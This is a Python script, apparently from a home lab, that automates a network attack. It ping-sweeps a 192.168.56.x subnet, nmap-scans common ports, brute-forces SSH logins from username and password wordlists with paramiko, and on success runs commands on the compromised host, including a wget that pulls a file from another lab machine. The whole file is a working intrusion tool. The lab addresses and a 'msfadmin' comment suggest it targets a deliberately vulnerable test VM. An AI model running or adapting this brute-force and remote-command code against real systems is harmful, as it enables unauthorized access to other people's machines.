import os
import sys
import threading
import nmap
import subprocess
import paramiko
import main
#import netifaces


IpList = []
SSHlist = []
usernames = []
passwords = []





def nmaper():
    print("\n----Scanning active machines for open ports----\n")
    portscan = nmap.PortScanner()
    scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
    #portnum = 22
    for target in IpList:
        print(f'Scanning: {target} for open ports:')
        #no output means no open ports
        for portnum in (scannedports):
            results = portscan.scan(target, str(portnum))
            results = results['scan'][target]['tcp'][portnum]['state']
            if (results == "open"):
                print(f'Port {portnum} is {results}.')
                if (portnum == 22):
                    SSHlist.append(target)

        print("-----------------------------------\n")
    #once all open ports have been found
        
def open_file():
    with open('usernames.txt') as usernamefile:
            for line in usernamefile:
                usernames.append(line.rstrip())
    with open('passwords.txt') as passwordfile:
            for line in passwordfile:
                passwords.append(line.rstrip())



def bruteforce():
    flag = False
    open_file()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #while (flag == False):
    for target in (SSHlist):
        print(f'\nBruteforcing SSH on {target} port 22\n')
        for user in usernames:
            print(f'\nTesting username: {user}')
            for passwd in passwords:
                print(f'Testing password: {passwd}')
                try:
                    client.connect(target, username=user, password=passwd)
                    if client.get_transport() is not None:
                        if client.get_transport().is_active():
                            print(f'Username: {user} and Password: {passwd} were successful!')
                            ssher(client)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Username or Password is incorrect.")
                    #flag = False
                except paramiko.ssh_exception.SSHException:
                    #flag = False
                    print('something is not working right')




def ssher(client):
    print("\nSuccessfully connected!")
    command = 'whoami'
    command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
    command3 = "cat yOu_HaVe_BeEn_HaCkEd"

    #client = paramiko.SSHClient()
    #client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #for target in (SSHlist):
        #for user in usernames:
            #try:
    #client.connect(target, username=user, password='msfadmin')
 #               return True
 #           except paramiko.ssh_exception.AuthenticationException:
#                return False
    print(f'\n$ {command}')
    (stdin, stdout, stderr) = client.exec_command(command)
    lines = stdout.readlines()
    print(lines[0])
    print(f'\n$ {command2}')
    (stdin, stdout, stderr) = client.exec_command(command2)
    #lines = stdout.readlines()
    #print(lines)
    print(f'\n$ {command3}')
    (stdin, stdout, stderr) = client.exec_command(command3)
    lines = stdout.readlines()
    print(lines)

    client.close()





def ping():
    print("\n----Scanning for active machines----")
    ipbase = "192.168.56."
    for x in range (100,110):
        ip = ipbase + str(x)
        if not os.system('ping -n 1 '+ip+' >'+ip):
            print(ip)
            IpList.append(ip)

    os.system('del '+ip)